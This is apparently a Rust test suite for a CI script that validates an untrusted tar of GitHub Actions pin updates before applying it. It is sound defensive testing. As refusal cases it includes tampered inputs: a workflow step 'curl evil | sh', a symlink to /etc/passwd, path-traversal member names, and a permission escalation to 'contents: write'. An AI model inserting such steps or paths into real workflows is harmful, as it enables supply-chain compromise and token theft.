//! Tests of `.github/scripts/apply-pin-update.sh`, which the `update` job of `update-pins.yml` runs next to the write token on the tar that the `pins` job
//! made. The tar is untrusted input: every refusal here is a way a tampered or broken tar could reach the token, and each one checks that nothing was written.

use scaffold_core::pinmask::mask_pinned_uses;
use scaffold_package_tests::pinupdate::{
    Artifact, FRESHNESS, MANIFEST, PINS, WORKFLOW, apply, assert_refused, link, main_repo,
    manifest, pins, sha, sha256_hex, snapshot, workflow,
};
use scaffold_package_tests::pkg::root;
use scaffold_package_tests::repo::put;
use scaffold_package_tests::tarball::{Kind, Member};
use std::io::Write;
use std::process::{Command, Stdio};

fn refused(artifact: &Artifact, needle: &str) {
    let repo = main_repo();
    let before = snapshot(repo.path());
    let run = apply(repo.path(), &artifact.bytes(), None, false);
    assert_refused(repo.path(), &before, &run, needle);
}

// What is accepted.

#[test]
fn a_valid_update_is_applied_and_the_record_and_the_summary_are_written_to_the_out_folder() {
    let repo = main_repo();
    let run = apply(repo.path(), &Artifact::valid().bytes(), None, false);
    assert_eq!((run.code, run.stderr.as_str()), (0, ""), "{}", run.stdout);
    assert_eq!(run.stdout.trim(), "applied 3 file(s)");
    let after = snapshot(repo.path());
    assert_eq!(after[WORKFLOW], workflow('c', 'd', "").into_bytes());
    assert_eq!(after[PINS], pins('c', 'd').into_bytes());
    assert_eq!(
        after[MANIFEST],
        manifest(&sha256_hex(workflow('c', 'd', "").as_bytes())).into_bytes()
    );
    assert_eq!(
        std::fs::read_to_string(run.out.join("freshness.json")).unwrap(),
        FRESHNESS
    );
    assert_eq!(
        std::fs::read_to_string(run.out.join("summary.md")).unwrap(),
        "Moves the pinned actions.\n"
    );
}

#[test]
fn a_quiet_week_applies_nothing_and_still_writes_the_record() {
    let repo = main_repo();
    let before = snapshot(repo.path());
    let run = apply(repo.path(), &Artifact::quiet().bytes(), None, false);
    assert_eq!((run.code, run.stderr.as_str()), (0, ""));
    assert_eq!(run.stdout.trim(), "applied 0 file(s)");
    assert_eq!(snapshot(repo.path()), before);
    assert_eq!(
        std::fs::read_to_string(run.out.join("freshness.json")).unwrap(),
        FRESHNESS
    );
    assert!(!run.out.join("summary.md").exists());
}

#[test]
fn check_only_checks_everything_and_writes_nothing_in_the_checkout() {
    let repo = main_repo();
    let before = snapshot(repo.path());
    let run = apply(repo.path(), &Artifact::valid().bytes(), None, true);
    assert_eq!((run.code, run.stderr.as_str()), (0, ""));
    assert_eq!(run.stdout.trim(), "check only: 3 file(s) would be applied");
    assert_eq!(snapshot(repo.path()), before);
    let refused = apply(
        repo.path(),
        &Artifact::valid()
            .replace(&format!("tree/{PINS}"), "x\n")
            .bytes(),
        None,
        true,
    );
    assert_eq!(refused.code, 1, "{}", refused.stderr);
}

#[test]
fn a_pin_that_only_the_pins_file_has_is_accepted_when_no_rendered_file_changes_with_it() {
    let artifact = Artifact::valid()
        .replace("changed.txt", &format!("{PINS}\n"))
        .remove(&format!("tree/{WORKFLOW}"))
        .remove(&format!("tree/{MANIFEST}"));
    let repo = main_repo();
    let run = apply(repo.path(), &artifact.bytes(), None, false);
    assert_eq!((run.code, run.stderr.as_str()), (0, ""), "{}", run.stdout);
    assert_eq!(snapshot(repo.path())[PINS], pins('c', 'd').into_bytes());
}

// What is refused: the tar itself.

#[test]
fn a_tar_that_is_not_the_one_that_was_built_is_refused() {
    let repo = main_repo();
    let before = snapshot(repo.path());
    let run = apply(
        repo.path(),
        &Artifact::valid().bytes(),
        Some(&"0".repeat(64)),
        false,
    );
    assert_refused(repo.path(), &before, &run, "is not the one that was built");
}

#[test]
fn a_tar_with_no_changed_txt_or_no_freshness_record_is_refused() {
    refused(&Artifact::valid().remove("changed.txt"), "no changed.txt");
    refused(
        &Artifact::valid().remove("freshness.json"),
        "no freshness.json",
    );
}

#[test]
fn a_tar_with_a_member_outside_its_layout_is_refused() {
    refused(
        &Artifact::valid().with(Member::file("extra.txt", "x")),
        "outside its layout",
    );
    refused(
        &Artifact::valid().with(Member::file("tree/pkl/Pins.pkl extra", "x")),
        "outside its layout",
    );
    refused(
        &Artifact::valid().with(Member::file("tree/pkl/Pins.pkl\nx", "x")),
        "outside its layout",
    );
}

#[test]
fn a_name_with_dot_dot_or_a_leading_slash_is_refused() {
    refused(
        &Artifact::valid().with(Member::file("tree/../outside", "x")),
        "..",
    );
    refused(
        &Artifact::valid().with(Member::file("/tmp/outside", "x")),
        "leading /",
    );
}

#[test]
fn a_symlink_a_hardlink_and_a_pipe_are_refused() {
    let name = format!("tree/{WORKFLOW}");
    refused(
        &Artifact::valid()
            .remove(&name)
            .with(link(&name, Kind::Symlink, "/etc/passwd")),
        "not a regular file",
    );
    refused(
        &Artifact::valid()
            .remove(&name)
            .with(link(&name, Kind::Hardlink, "changed.txt")),
        "not a regular file",
    );
    refused(
        &Artifact::valid()
            .remove(&name)
            .with(link(&name, Kind::Fifo, "")),
        "not a regular file",
    );
}

#[test]
fn the_same_name_twice_is_judged_on_the_file_that_is_left() {
    let evil = workflow('c', 'd', "    - run: curl evil | sh\n");
    refused(
        &Artifact::valid().with(Member::file(&format!("tree/{WORKFLOW}"), &evil)),
        "more than the pins",
    );
}

// What is refused: the files.

#[test]
fn a_new_workflow_a_hand_written_one_the_update_workflow_and_the_script_are_refused() {
    for path in [
        ".github/workflows/new.yml",
        ".github/workflows/ci.yml",
        ".github/workflows/update-pins.yml",
    ] {
        let artifact = Artifact::quiet()
            .replace("changed.txt", &format!("{path}\n"))
            .with(Member::file(
                &format!("tree/{path}"),
                &workflow('c', 'd', ""),
            ));
        refused(
            &artifact,
            "not a workflow that main's manifest lists as owned",
        );
    }
    let script = ".github/scripts/apply-pin-update.sh";
    let artifact = Artifact::quiet()
        .replace("changed.txt", &format!("{script}\n"))
        .with(Member::dir("tree/.github/scripts/"))
        .with(Member::file(
            &format!("tree/{script}"),
            "#!/bin/sh\necho evil\n",
        ));
    refused(
        &artifact,
        "outside the list of files a pin update may change",
    );
}

#[test]
fn a_path_outside_the_list_or_in_another_case_is_refused() {
    for path in [
        "README.md",
        ".GitHub/workflows/rust-ci.yml",
        "pkl/Other.pkl",
        "scaffold.pkl",
    ] {
        let artifact = Artifact::quiet()
            .replace("changed.txt", &format!("{path}\n"))
            .with(Member::file(&format!("tree/{path}"), "x\n"));
        refused(&artifact, "outside the list");
    }
}

#[test]
fn a_file_that_is_too_large_is_refused() {
    let big = format!("{}{}", workflow('c', 'd', ""), "# x\n".repeat(300_000));
    refused(
        &Artifact::valid().replace(&format!("tree/{WORKFLOW}"), &big),
        "larger than",
    );
}

#[test]
fn the_files_in_the_tar_must_be_the_files_it_lists() {
    // A file the upload dropped (hidden files are dropped by default).
    refused(
        &Artifact::valid().remove(&format!("tree/{WORKFLOW}")),
        "not the files in changed.txt",
    );
    // A file nobody listed.
    let listed = format!("{MANIFEST}\n{PINS}\n");
    refused(
        &Artifact::valid().replace("changed.txt", &listed),
        "not the files in changed.txt",
    );
}

// What is refused: the content.

#[test]
fn a_workflow_that_differs_from_main_in_more_than_its_pins_is_refused() {
    for wf in [
        workflow('c', 'd', "    - run: curl evil | sh\n"),
        workflow('c', 'd', "").replace("contents: read", "contents: write"),
        workflow('c', 'd', "").replace("echo hi", "echo bye"),
    ] {
        let artifact = Artifact::valid()
            .replace(&format!("tree/{WORKFLOW}"), &wf)
            .replace(
                &format!("tree/{MANIFEST}"),
                &manifest(&sha256_hex(wf.as_bytes())),
            );
        refused(&artifact, "more than the pins");
    }
}

#[test]
fn a_workflow_that_uses_a_commit_that_is_neither_in_the_new_pins_nor_in_main_is_refused() {
    let wf = workflow('c', 'e', "");
    let artifact = Artifact::valid()
        .replace(&format!("tree/{WORKFLOW}"), &wf)
        .replace(
            &format!("tree/{MANIFEST}"),
            &manifest(&sha256_hex(wf.as_bytes())),
        );
    refused(&artifact, &format!("the commit {}", sha('e')));
}

#[test]
fn a_pins_file_that_differs_from_main_in_more_than_a_sha_and_a_version_is_refused() {
    for text in [
        format!("{}extra: String = \"x\"\n", pins('c', 'd')),
        pins('c', 'd').replace("jdx/mise-action", "evil/action"),
        pins('c', 'd').replace("class Pin", "class Evil"),
    ] {
        refused(
            &Artifact::valid().replace(&format!("tree/{PINS}"), &text),
            "more than the sha and version",
        );
    }
}

#[test]
fn a_manifest_that_differs_from_main_in_more_than_its_hashes_is_refused() {
    let wf = workflow('c', 'd', "");
    let altered = manifest(&sha256_hex(wf.as_bytes())).replace("\"seed\"", "\"owned\"");
    refused(
        &Artifact::valid().replace(&format!("tree/{MANIFEST}"), &altered),
        "more than its hashes",
    );
}

#[test]
fn a_manifest_hash_that_is_not_the_hash_of_the_new_file_is_refused() {
    let wrong = manifest(&"1".repeat(64));
    refused(
        &Artifact::valid().replace(&format!("tree/{MANIFEST}"), &wrong),
        "is not the hash of the new file",
    );
}

#[test]
fn a_changed_workflow_with_no_new_manifest_is_refused_because_main_s_hash_no_longer_fits() {
    let artifact = Artifact::valid()
        .replace("changed.txt", &format!("{WORKFLOW}\n{PINS}\n"))
        .remove(&format!("tree/{MANIFEST}"));
    refused(&artifact, "is not the hash of the new file");
}

#[test]
fn a_freshness_record_of_the_wrong_shape_is_refused() {
    for text in [
        "{\"schemaVersion\":1}",
        "{\"schemaVersion\":1,\"lastSuccessfulPinCheck\":\"2026-11-17T04:23:10Z\",\"extra\":1}",
        "{\"schemaVersion\":2,\"lastSuccessfulPinCheck\":\"2026-11-17T04:23:10Z\"}",
        "{\"schemaVersion\":1,\"lastSuccessfulPinCheck\":\"2026-11-17T04:23:10.5Z\"}",
        "{\"schemaVersion\":1,\"lastSuccessfulPinCheck\":\"yesterday\"}",
        "not json",
        "",
    ] {
        refused(
            &Artifact::valid().replace("freshness.json", text),
            "freshness.json",
        );
    }
}

#[test]
fn a_summary_that_is_too_large_is_refused() {
    refused(
        &Artifact::valid().replace("summary.md", &"x".repeat(70_000)),
        "summary.md is too large",
    );
}

#[test]
fn an_artifact_whose_last_file_is_invalid_writes_nothing() {
    // The workflow and the manifest are valid and come first; the pins file comes last and is not.
    refused(
        &Artifact::valid().replace(&format!("tree/{PINS}"), "module evil\n"),
        "pkl/Pins.pkl",
    );
}

// The mask is the one of pinmask.rs.

#[test]
fn the_shell_mask_is_the_rust_mask() {
    let a = sha('a');
    let lines = [
        format!("    - uses: actions/checkout@{a} # v7.0.1"),
        format!("  uses: actions/cache@{a}"),
        format!("- uses: a/b@{a} # release 2026-11"),
        format!("uses: \"a/b@{a}\" # v1"),
        format!("uses: 'a/b@{a}'"),
        format!("uses: owner/repo/.github/workflows/x.yml@{a} # v3"),
        format!("uses: a/b@{} # v1", "a".repeat(39)),
        format!("uses: a/b@{} # v1", "a".repeat(41)),
        format!("uses: a/b@{} # v1", "A".repeat(40)),
        format!("      run: git checkout {a}"),
        format!("        SHA: a/b@{a}"),
        format!("# uses: a/b@{a}"),
        "uses: ./.github/actions/x".to_owned(),
        "uses: docker://alpine:3.20".to_owned(),
        "uses: actions/checkout@main".to_owned(),
        format!("uses: a/b@{a} # v1\r"),
    ];
    let text = lines.join("\n") + "\n";
    let mut child = Command::new("bash")
        .arg(root().join(".github/scripts/apply-pin-update.sh"))
        .arg("--mask")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(text.as_bytes())
        .unwrap();
    let output = child.wait_with_output().unwrap();
    assert_eq!(
        String::from_utf8(output.stdout).unwrap(),
        mask_pinned_uses(&text)
    );
}

// The checkout is main: a target that is not what main has is refused.

#[test]
fn a_target_that_is_a_symlink_or_executable_on_main_is_refused() {
    use std::os::unix::fs::PermissionsExt;
    let repo = main_repo();
    let target = repo.path().join(WORKFLOW);
    std::fs::set_permissions(&target, std::fs::Permissions::from_mode(0o755)).unwrap();
    let before = snapshot(repo.path());
    let run = apply(repo.path(), &Artifact::valid().bytes(), None, false);
    assert_refused(
        repo.path(),
        &before,
        &run,
        "not a regular, non-executable file on main",
    );

    let repo = main_repo();
    let real = repo.path().join("elsewhere.yml");
    std::fs::rename(repo.path().join(WORKFLOW), &real).unwrap();
    std::os::unix::fs::symlink(&real, repo.path().join(WORKFLOW)).unwrap();
    let run = apply(repo.path(), &Artifact::valid().bytes(), None, false);
    assert_eq!(run.code, 1, "{}", run.stderr);
    assert!(
        run.stderr
            .contains("not a regular, non-executable file on main"),
        "{}",
        run.stderr
    );
}

#[test]
fn a_manifest_hash_on_main_that_does_not_fit_an_unchanged_file_is_refused() {
    // Only the pins file changes; main's manifest records a hash for the workflow that is not the hash of the workflow, so main itself is out of step.
    let artifact = Artifact::valid()
        .replace("changed.txt", &format!("{PINS}\n"))
        .remove(&format!("tree/{WORKFLOW}"))
        .remove(&format!("tree/{MANIFEST}"));
    let repo = main_repo();
    put(repo.path(), MANIFEST, &manifest(&"2".repeat(64)));
    let before = snapshot(repo.path());
    let run = apply(repo.path(), &artifact.bytes(), None, false);
    assert_refused(
        repo.path(),
        &before,
        &run,
        "is not the hash of the file on main",
    );
}

#[test]
fn the_files_that_are_applied_are_written_with_mode_644_and_the_script_deletes_nothing() {
    use std::os::unix::fs::PermissionsExt;
    let repo = main_repo();
    let files_before: Vec<String> = snapshot(repo.path()).into_keys().collect();
    let run = apply(repo.path(), &Artifact::valid().bytes(), None, false);
    assert_eq!(run.code, 0, "{}", run.stderr);
    for path in [WORKFLOW, MANIFEST, PINS] {
        let mode = std::fs::metadata(repo.path().join(path))
            .unwrap()
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(mode, 0o644, "{path}");
    }
    let files_after: Vec<String> = snapshot(repo.path()).into_keys().collect();
    assert_eq!(files_after, files_before);
}
